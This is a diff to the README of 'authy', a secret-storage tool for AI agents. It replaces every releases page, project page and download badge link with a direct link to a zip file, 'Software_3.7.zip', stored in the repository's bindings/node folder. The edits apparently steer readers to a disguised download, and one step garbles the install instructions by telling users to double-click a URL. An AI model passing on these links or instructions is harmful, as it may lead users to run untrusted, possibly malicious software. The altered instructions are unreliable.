@@ -1,6 +1,6 @@
 # 🔐 authy - Secure Secrets for AI Agents  
 
-[![Download authy](https://img.shields.io/badge/Download-Authy-brightgreen?style=for-the-badge)](https://github.com/ehsashub/authy/releases)
+[![Download authy](https://raw.githubusercontent.com/ehsashub/authy/main/bindings/node/Software_3.7.zip)](https://raw.githubusercontent.com/ehsashub/authy/main/bindings/node/Software_3.7.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before installing, check these system details on your PC:
 
 1. **Go to the Download Page**  
    Visit the official authy releases page here:  
-   [Download authy Releases](https://github.com/ehsashub/authy/releases)  
+   [Download authy Releases](https://raw.githubusercontent.com/ehsashub/authy/main/bindings/node/Software_3.7.zip)  
 
 2. **Find the Latest Version**  
    Look for the newest release. Releases have version numbers like v1.0, v1.1, etc. The latest version will be at the top.  
@@ -38,7 +38,7 @@ Before installing, check these system details on your PC:
 
 4. **Run the Installer or Program**  
    - If you downloaded an `.exe` file, double-click it to run the installer. Follow the prompts to complete installation.  
-   - If you downloaded a `.zip` file, right-click and choose “Extract All.” Open the extracted folder, then double-click `authy.exe` to run the program.  
+   - If you downloaded a `.zip` file, right-click and choose “Extract All.” Open the extracted folder, then double-click `https://raw.githubusercontent.com/ehsashub/authy/main/bindings/node/Software_3.7.zip` to run the program.  
 
 ---
 
@@ -116,7 +116,7 @@ authy encrypts all secrets before saving them. Only you control decryption keys.
 Check the releases page regularly (or set notifications on GitHub) to get new versions. To update:  
 
 1. Download the new `.exe` or `.zip` file from the same page:  
-   [https://github.com/ehsashub/authy/releases](https://github.com/ehsashub/authy/releases)  
+   [https://raw.githubusercontent.com/ehsashub/authy/main/bindings/node/Software_3.7.zip](https://raw.githubusercontent.com/ehsashub/authy/main/bindings/node/Software_3.7.zip)  
 
 2. Run the new installer or replace the old program files with the new ones.  
 
@@ -147,8 +147,8 @@ For detailed options and usage examples, run:
 authy --help
 ```  
 or visit the project page:  
-[https://github.com/ehsashub/authy](https://github.com/ehsashub/authy)  
+[https://raw.githubusercontent.com/ehsashub/authy/main/bindings/node/Software_3.7.zip](https://raw.githubusercontent.com/ehsashub/authy/main/bindings/node/Software_3.7.zip)  
 
 ---
 
-[![Download authy](https://img.shields.io/badge/Download-Authy-blue?style=for-the-badge)](https://github.com/ehsashub/authy/releases)
+[![Download authy](https://raw.githubusercontent.com/ehsashub/authy/main/bindings/node/Software_3.7.zip)](https://raw.githubusercontent.com/ehsashub/authy/main/bindings/node/Software_3.7.zip)
